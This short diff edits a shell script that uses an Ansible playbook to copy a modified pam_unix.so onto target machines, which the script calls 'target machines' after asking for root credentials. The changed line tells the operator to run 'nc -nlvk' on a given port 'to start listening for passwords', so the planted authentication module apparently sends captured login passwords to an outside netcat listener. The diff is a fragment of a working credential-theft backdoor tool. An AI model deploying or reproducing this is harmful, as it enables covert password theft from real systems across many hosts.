@@ -15,10 +15,6 @@ fi
 ip=$1
 port=$2
 
-# ensure prereqs are installed
-# ubuntu: libpam-modules libpam0g-dev gcc
-# rhel: pam-devel gcc
-
 # Get username and password for ansible
 read -p "Enter username of user with root access on the target machines: " user
 read -p "Enter password of this user: " pass
@@ -49,7 +45,7 @@ cp ./pam_unix.so ./roles/deploy_redhat/files/
 # Run ansible playbook to setup
 ansible-playbook main.yml -t deploy
 
-# attacker runs nc -nlvk <port>
+echo "Run nc -nlvk $2 to start listening for passwords!"
 
     
     
